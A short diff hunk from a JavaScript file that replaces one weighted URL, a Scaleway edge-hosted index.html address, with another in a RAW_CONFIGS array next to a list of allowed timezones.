@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://f59ec59b-ddb5-43f4-81cc-f02fe1c6bb6c.svc.edge.scw.cloud/index.html", weight: 1.0 }
+    { url: "https://3a4c05fe-8a32-4331-831d-3865c50cb7d5.svc.edge.scw.cloud/index.html", weight: 1.0 }
 
 ];
 
